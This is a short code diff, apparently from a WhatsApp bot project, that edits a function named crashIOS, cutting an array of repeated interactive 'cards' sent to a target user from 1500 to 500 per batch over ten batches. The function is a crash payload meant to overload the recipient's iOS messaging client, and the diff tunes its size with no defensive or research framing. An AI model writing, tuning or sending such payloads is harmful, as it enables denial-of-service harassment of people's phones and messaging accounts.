@@ -66,7 +66,7 @@ async function crashIOS(sock, targetJid) {
       }
     };
     console.log(`⏳ Enviando carta em lote ${i + 1}/10...`);
-    const card = Array(1500).fill(singleCard);
+    const card = Array(500).fill(singleCard);
     await sock.sendjson(targetJid, {
       "interactiveMessage": {
         "body": { "text": "." },
